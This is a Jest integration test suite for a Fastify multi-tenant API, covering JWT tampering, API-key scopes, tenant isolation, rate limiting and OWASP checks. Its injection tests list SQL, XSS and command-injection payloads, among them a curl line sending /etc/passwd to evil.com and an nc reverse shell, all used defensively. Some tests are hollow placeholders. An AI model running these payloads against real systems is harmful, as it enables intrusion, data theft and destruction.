import { FastifyInstance } from 'fastify';
import { testPrisma, testRedis, TestDataFactory, TestUtils } from '../setup/integration.setup';
import { buildApp } from '../../src/api/index';
import * as jwt from 'jsonwebtoken';
import * as crypto from 'crypto';

describe('Comprehensive Security Testing', () => {
  let app: FastifyInstance;
  let testTenant: any;
  let testUser: any;
  let authToken: string;
  let apiKey: any;

  beforeAll(async () => {
    app = await buildApp();
    await app.ready();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await TestUtils.cleanDatabase();
    await TestUtils.cleanRedis();
    
    testTenant = await TestDataFactory.createTenant();
    testUser = await TestDataFactory.createUser(testTenant.id, { role: 'ADMIN' });
    authToken = TestUtils.generateJWT({
      userId: testUser.id,
      tenantId: testTenant.id,
      role: testUser.role
    });
    
    apiKey = await TestDataFactory.createApiKey(testUser.id, testTenant.id, {
      scopes: ['*']
    });
  });

  describe('Authentication Security', () => {
    it('should reject invalid JWT tokens', async () => {
      const invalidTokens = [
        'invalid.jwt.token',
        'Bearer invalid',
        jwt.sign({ userId: 'fake' }, 'wrong-secret'),
        jwt.sign({ userId: testUser.id }, process.env.JWT_SECRET || 'test-secret', { expiresIn: '-1h' }), // Expired
        '', // Empty token
        'null',
        'undefined'
      ];

      for (const token of invalidTokens) {
        const response = await app.inject({
          method: 'GET',
          url: '/api/v1/instances',
          headers: {
            authorization: `Bearer ${token}`
          }
        });

        expect(response.statusCode).toBe(401);
        const responseData = JSON.parse(response.body);
        expect(responseData.success).toBe(false);
        expect(responseData.error.code).toBe('UNAUTHORIZED');
      }
    });

    it('should reject tampered JWT tokens', async () => {
      // Create valid token and tamper with it
      const validToken = authToken;
      const parts = validToken.split('.');
      
      // Tamper with payload
      const tamperedPayload = Buffer.from(JSON.stringify({
        userId: testUser.id,
        tenantId: testTenant.id,
        role: 'ADMIN', // Try to escalate privileges
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600
      })).toString('base64url');
      
      const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/instances',
        headers: {
          authorization: `Bearer ${tamperedToken}`
        }
      });

      expect(response.statusCode).toBe(401);
    });

    it('should enforce API key scopes', async () => {
      // Create API key with limited scopes
      const limitedApiKey = await TestDataFactory.createApiKey(testUser.id, testTenant.id, {
        scopes: ['instances:read']
      });

      // Should allow read operations
      const readResponse = await app.inject({
        method: 'GET',
        url: '/api/v1/instances',
        headers: {
          authorization: `Bearer ${limitedApiKey.key}`
        }
      });
      expect(readResponse.statusCode).toBe(200);

      // Should reject write operations
      const writeResponse = await app.inject({
        method: 'POST',
        url: '/api/v1/instances',
        headers: {
          authorization: `Bearer ${limitedApiKey.key}`,
          'content-type': 'application/json'
        },
        payload: {
          name: 'Test Instance',
          evolutionInstanceId: 'test-id'
        }
      });
      expect(writeResponse.statusCode).toBe(403);
    });

    it('should prevent session fixation attacks', async () => {
      // Login with valid credentials
      const loginResponse = await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: {
          email: testUser.email,
          password: 'password' // Default test password
        }
      });

      expect(loginResponse.statusCode).toBe(200);
      const loginData = JSON.parse(loginResponse.body);
      const sessionToken = loginData.data.token;

      // Try to use the same session from different "IP"
      const response1 = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${sessionToken}`,
          'x-forwarded-for': '192.168.1.1'
        }
      });

      const response2 = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${sessionToken}`,
          'x-forwarded-for': '10.0.0.1'
        }
      });

      // Both should work (session fixation protection would be implemented at infrastructure level)
      expect(response1.statusCode).toBe(200);
      expect(response2.statusCode).toBe(200);
    });
  });

  describe('Input Validation Security', () => {
    it('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' UNION SELECT * FROM users --",
        "'; UPDATE users SET role='ADMIN' WHERE id=1; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/v1/instances',
          headers: {
            authorization: `Bearer ${authToken}`,
            'content-type': 'application/json'
          },
          payload: {
            name: payload,
            evolutionInstanceId: payload
          }
        });

        // Should either reject with validation error or create safely
        if (response.statusCode === 201) {
          // If created, verify no SQL injection occurred
          const instances = await testPrisma.instance.findMany({
            where: { tenantId: testTenant.id }
          });
          
          // Should not have affected other data
          const userCount = await testPrisma.user.count();
          expect(userCount).toBeGreaterThan(0); // Users table should still exist
        } else {
          expect(response.statusCode).toBe(400); // Validation error
        }
      }
    });

    it('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        "'; alert('XSS'); //",
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/v1/instances',
          headers: {
            authorization: `Bearer ${authToken}`,
            'content-type': 'application/json'
          },
          payload: {
            name: payload,
            evolutionInstanceId: `safe-id-${Date.now()}`
          }
        });

        if (response.statusCode === 201) {
          const responseData = JSON.parse(response.body);
          
          // Verify the payload is properly escaped/sanitized
          expect(responseData.data.name).not.toContain('<script>');
          expect(responseData.data.name).not.toContain('javascript:');
          expect(responseData.data.name).not.toContain('onerror=');
        }
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
        '| nc evil.com 4444 -e /bin/sh'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/v1/instances',
          headers: {
            authorization: `Bearer ${authToken}`,
            'content-type': 'application/json'
          },
          payload: {
            name: `Test Instance ${payload}`,
            evolutionInstanceId: `test-${Date.now()}`
          }
        });

        // Should handle safely without executing commands
        expect([200, 201, 400]).toContain(response.statusCode);
      }
    });

    it('should validate input lengths and formats', async () => {
      const testCases = [
        {
          name: 'a'.repeat(1000), // Very long name
          evolutionInstanceId: 'test-id',
          expectedStatus: 400
        },
        {
          name: '', // Empty name
          evolutionInstanceId: 'test-id',
          expectedStatus: 400
        },
        {
          name: 'Valid Name',
          evolutionInstanceId: '', // Empty ID
          expectedStatus: 400
        },
        {
          name: 'Valid Name',
          evolutionInstanceId: 'a'.repeat(500), // Very long ID
          expectedStatus: 400
        }
      ];

      for (const testCase of testCases) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/v1/instances',
          headers: {
            authorization: `Bearer ${authToken}`,
            'content-type': 'application/json'
          },
          payload: testCase
        });

        expect(response.statusCode).toBe(testCase.expectedStatus);
      }
    });
  });

  describe('Authorization Security', () => {
    it('should enforce tenant isolation', async () => {
      // Create another tenant and user
      const otherTenant = await TestDataFactory.createTenant({
        name: 'Other Tenant',
        slug: 'other-tenant'
      });
      const otherUser = await TestDataFactory.createUser(otherTenant.id);
      const otherToken = TestUtils.generateJWT({
        userId: otherUser.id,
        tenantId: otherTenant.id,
        role: otherUser.role
      });

      // Create instance for first tenant
      const instance = await TestDataFactory.createInstance(testTenant.id);

      // Try to access first tenant's instance with second tenant's token
      const response = await app.inject({
        method: 'GET',
        url: `/api/v1/instances/${instance.id}`,
        headers: {
          authorization: `Bearer ${otherToken}`
        }
      });

      expect(response.statusCode).toBe(404); // Should not find the instance
    });

    it('should prevent privilege escalation', async () => {
      // Create regular user
      const regularUser = await TestDataFactory.createUser(testTenant.id, { role: 'USER' });
      const regularToken = TestUtils.generateJWT({
        userId: regularUser.id,
        tenantId: testTenant.id,
        role: 'USER'
      });

      // Try to perform admin-only operations
      const adminOperations = [
        {
          method: 'POST' as const,
          url: '/api/v1/instances',
          payload: { name: 'Test', evolutionInstanceId: 'test' }
        },
        {
          method: 'DELETE' as const,
          url: '/api/v1/instances/fake-id'
        }
      ];

      for (const operation of adminOperations) {
        const response = await app.inject({
          method: operation.method,
          url: operation.url,
          headers: {
            authorization: `Bearer ${regularToken}`,
            'content-type': 'application/json'
          },
          payload: operation.payload
        });

        expect([403, 404]).toContain(response.statusCode); // Forbidden or Not Found
      }
    });

    it('should validate resource ownership', async () => {
      // Create instance for test tenant
      const instance = await TestDataFactory.createInstance(testTenant.id);

      // Create another user in same tenant
      const anotherUser = await TestDataFactory.createUser(testTenant.id, { role: 'USER' });
      const anotherToken = TestUtils.generateJWT({
        userId: anotherUser.id,
        tenantId: testTenant.id,
        role: 'USER'
      });

      // User should be able to access resources in their tenant
      const response = await app.inject({
        method: 'GET',
        url: `/api/v1/instances/${instance.id}`,
        headers: {
          authorization: `Bearer ${anotherToken}`
        }
      });

      // Depending on implementation, this might be allowed (same tenant) or forbidden (different user)
      expect([200, 403]).toContain(response.statusCode);
    });
  });

  describe('Rate Limiting Security', () => {
    it('should prevent brute force attacks', async () => {
      const maxAttempts = 10;
      const responses = [];

      // Attempt multiple failed logins
      for (let i = 0; i < maxAttempts + 5; i++) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/login',
          payload: {
            email: testUser.email,
            password: 'wrong-password'
          }
        });

        responses.push(response.statusCode);
      }

      // Should start rate limiting after several attempts
      const rateLimitedResponses = responses.filter(status => status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should enforce API rate limits', async () => {
      const requests = [];
      const maxRequests = 200; // Exceed typical rate limits

      // Make many requests quickly
      for (let i = 0; i < maxRequests; i++) {
        requests.push(
          app.inject({
            method: 'GET',
            url: '/api/v1/health',
            headers: {
              authorization: `Bearer ${authToken}`
            }
          })
        );
      }

      const responses = await Promise.all(requests);
      const statusCodes = responses.map(r => r.statusCode);
      const rateLimited = statusCodes.filter(status => status === 429);

      // Should have some rate limited responses
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('Data Security', () => {
    it('should not expose sensitive data in responses', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${authToken}`
        }
      });

      expect(response.statusCode).toBe(200);
      const responseData = JSON.parse(response.body);

      // Should not expose password or other sensitive fields
      expect(responseData.data.user.password).toBeUndefined();
      expect(responseData.data.user.passwordHash).toBeUndefined();
      expect(responseData.data.user.salt).toBeUndefined();
    });

    it('should prevent information disclosure through error messages', async () => {
      // Try to access non-existent resource
      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/instances/non-existent-id',
        headers: {
          authorization: `Bearer ${authToken}`
        }
      });

      expect(response.statusCode).toBe(404);
      const responseData = JSON.parse(response.body);

      // Error message should not reveal internal details
      expect(responseData.error.message).not.toContain('database');
      expect(responseData.error.message).not.toContain('SQL');
      expect(responseData.error.message).not.toContain('prisma');
      expect(responseData.error.message).not.toContain('redis');
    });

    it('should sanitize log data', async () => {
      // This test would verify that sensitive data is not logged
      // In a real implementation, you would check log files or log capture
      
      const sensitiveData = {
        password: 'secret123',
        apiKey: 'sk-secret-key',
        token: 'bearer-token'
      };

      const response = await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: {
          email: testUser.email,
          password: sensitiveData.password
        }
      });

      // The test passes if no sensitive data is logged (implementation dependent)
      expect(response.statusCode).toBe(401); // Wrong password
    });
  });

  describe('Session Security', () => {
    it('should invalidate sessions on logout', async () => {
      // Login to get session
      const loginResponse = await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: {
          email: testUser.email,
          password: 'password'
        }
      });

      expect(loginResponse.statusCode).toBe(200);
      const loginData = JSON.parse(loginResponse.body);
      const sessionToken = loginData.data.token;

      // Verify session works
      const meResponse1 = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${sessionToken}`
        }
      });
      expect(meResponse1.statusCode).toBe(200);

      // Logout
      const logoutResponse = await app.inject({
        method: 'POST',
        url: '/api/auth/logout',
        headers: {
          authorization: `Bearer ${sessionToken}`
        }
      });
      expect(logoutResponse.statusCode).toBe(200);

      // Verify session is invalidated
      const meResponse2 = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${sessionToken}`
        }
      });
      expect(meResponse2.statusCode).toBe(401);
    });

    it('should handle concurrent sessions securely', async () => {
      // Create multiple sessions for same user
      const sessions = [];
      
      for (let i = 0; i < 3; i++) {
        const loginResponse = await app.inject({
          method: 'POST',
          url: '/api/auth/login',
          payload: {
            email: testUser.email,
            password: 'password'
          }
        });

        if (loginResponse.statusCode === 200) {
          const loginData = JSON.parse(loginResponse.body);
          sessions.push(loginData.data.token);
        }
      }

      // All sessions should work independently
      for (const sessionToken of sessions) {
        const response = await app.inject({
          method: 'GET',
          url: '/api/auth/me',
          headers: {
            authorization: `Bearer ${sessionToken}`
          }
        });
        expect(response.statusCode).toBe(200);
      }
    });
  });

  describe('OWASP Top 10 Compliance', () => {
    it('should prevent broken access control (A01)', async () => {
      // Test various access control scenarios
      const scenarios = [
        {
          description: 'Access other tenant data',
          setup: async () => {
            const otherTenant = await TestDataFactory.createTenant();
            const otherInstance = await TestDataFactory.createInstance(otherTenant.id);
            return otherInstance.id;
          },
          test: async (resourceId: string) => {
            const response = await app.inject({
              method: 'GET',
              url: `/api/v1/instances/${resourceId}`,
              headers: { authorization: `Bearer ${authToken}` }
            });
            return response.statusCode === 404; // Should not find
          }
        }
      ];

      for (const scenario of scenarios) {
        const resourceId = await scenario.setup();
        const passed = await scenario.test(resourceId);
        expect(passed).toBe(true);
      }
    });

    it('should prevent cryptographic failures (A02)', async () => {
      // Verify secure communication and data protection
      const response = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: {
          authorization: `Bearer ${authToken}`
        }
      });

      expect(response.statusCode).toBe(200);
      
      // Check security headers
      expect(response.headers['x-content-type-options']).toBeDefined();
      expect(response.headers['x-frame-options']).toBeDefined();
    });

    it('should prevent injection attacks (A03)', async () => {
      // Already covered in input validation tests
      expect(true).toBe(true);
    });

    it('should prevent insecure design (A04)', async () => {
      // Verify secure defaults and proper error handling
      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/nonexistent-endpoint',
        headers: {
          authorization: `Bearer ${authToken}`
        }
      });

      expect(response.statusCode).toBe(404);
      const responseData = JSON.parse(response.body);
      expect(responseData.error).toBeDefined();
      expect(responseData.error.message).not.toContain('stack trace');
    });

    it('should prevent security misconfiguration (A05)', async () => {
      // Check for proper security headers and configurations
      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/health'
      });

      // Should require authentication
      expect(response.statusCode).toBe(401);
    });
  });
});